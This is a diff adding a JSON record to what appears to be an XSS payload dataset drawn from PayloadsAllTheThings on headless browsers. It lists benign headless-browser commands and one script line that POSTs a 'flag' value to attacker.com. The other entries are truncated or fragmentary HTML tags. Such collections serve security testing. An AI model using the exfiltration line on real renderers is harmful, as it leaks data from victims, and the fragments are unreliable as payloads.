@@ -1,0 +1,27 @@
+{
+  "id": "xss-d4529df06fd2",
+  "category": "XSS",
+  "title": "README",
+  "description": "# Headless Browser\n\n> A headless browser is a web browser without a graphical user interface. It works just like a regular browser, such as Chrome or Firefox, by interpreting HTML, CSS, and JavaScript, but it does so in the background, without displaying any visuals.\n> Headless browsers are primarily used for automated tasks, such as web scraping, testing, and running scripts. They are particularly useful in situations where a full-fledged browser is not needed, or where resources (like memory o",
+  "payloads": [
+    "google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com",
+    "firefox --screenshot https://www.google.com",
+    "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --disable-gpu --window-size=1280,720 --screenshot=\"C:\\tmp\\screen.png\" \"https://google.com\"",
+    "<script>",
+    "fetch(\"https://attacker.com/\", { method: \"POST\", body: flag})",
+    "</script>",
+    "Target: `google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`",
+    "<html>",
+    "<body>",
+    "<script>",
+    "</script>",
+    "</body>",
+    "</html>",
+    "<html>",
+    "<body>"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Headless Browser/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
